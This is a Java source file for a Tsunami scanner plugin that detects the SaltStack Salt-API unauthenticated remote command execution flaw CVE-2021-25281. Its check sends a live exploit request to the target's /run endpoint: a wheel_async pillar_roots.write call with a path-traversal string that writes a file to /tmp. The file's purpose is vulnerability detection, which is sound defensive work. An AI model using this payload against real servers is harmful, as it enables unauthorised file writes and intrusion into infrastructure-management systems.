package com.google.tsunami.plugins.detectors.saltstack.cve202125281;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.tsunami.common.net.http.HttpRequest.post;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.common.net.MediaType;
import com.google.gson.JsonArray;
import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import com.google.gson.JsonSyntaxException;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpStatus;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import java.util.Optional;
import javax.inject.Inject;

/**
 * A {@link VulnDetector} that detects the CVE-2021-25281 vulnerability.
 */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "SaltStackCVE202125281VulnDetector",
    version = "1.0",
    description = "This detector checks for SaltStack Salt-API Unauthenticated "
        + "Remote Command Execution vulnerability (CVE-2021-25281).",
    author = "C4o (syttcasd@gmail.com)",
    bootstrapModule = SaltStackCVE202125281VulnDetectorBootstrapModule.class
)
public class SaltStackCVE202125281VulnDetector implements VulnDetector {

  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  private final Clock utcClock;
  private final HttpClient httpClient;

  @Inject
  SaltStackCVE202125281VulnDetector(@UtcClock Clock utcClock, HttpClient httpClient) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    String targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + "run";
    HttpHeaders httpHeaders = HttpHeaders.builder()
        .addHeader(com.google.common.net.HttpHeaders.CONTENT_TYPE, MediaType.JSON_UTF_8.toString())
        .build();
    ByteString httpBody = ByteString.copyFromUtf8(
        "{\"eauth\": \"auto\", \"client\": \"wheel_async\", "
            + "\"fun\": \"pillar_roots.write\", \"data\": \"test\", \"path\": "
            + "\"../../../../../../../../../../../../../../../../../../tmp/success\"}");
    try {
      HttpResponse response = httpClient.send(
          post(targetUri).withEmptyHeaders().setHeaders(httpHeaders).setRequestBody(httpBody)
              .build());
      Optional<JsonElement> body = response.bodyJson();
      if (response.status() == HttpStatus.OK && body.isPresent()) {
        JsonElement jsonElement = body.get();
        if (!jsonElement.isJsonObject()) {
          return false;
        }
        if (!jsonElement.getAsJsonObject().has("return") ||
            !jsonElement.getAsJsonObject().get("return").isJsonArray()) {
          return false;
        }
        JsonArray returnArray = jsonElement.getAsJsonObject().get("return").getAsJsonArray();
        if (returnArray.size() == 0 || !returnArray.get(0).isJsonObject()) {
          return false;
        }
        JsonObject returnObject = returnArray.get(0).getAsJsonObject();
        if (returnObject.has("tag") && returnObject.has("jid")) {
          return true;
        }
      }
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUri);
    } catch (JsonSyntaxException e) {
      logger.atWarning().withCause(e).log("Unable to parse response body '%s'.", targetUri);
    }
    return false;
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder().setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("CVE_2021_25281"))
                .setSeverity(Severity.HIGH)
                .setTitle(
                    "SaltStack Salt-API Unauthenticated Remote Command Execution vulnerability")
                .setDescription(
                    "The SaltAPI does not honor eauth credentials for the wheel_async client. "
                        + "Thus, an attacker can remotely run any wheel modules on the master."
                        + "The Salt-API does not have eAuth credentials for the wheel_async"
                        + " client\n"
                        + "https://nvd.nist.gov/vuln/detail/CVE-2021-25281\n"
                        + "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25281")
                .setRecommendation("Update 2021-FEB-25 released.")
        )
        .build();
  }
}
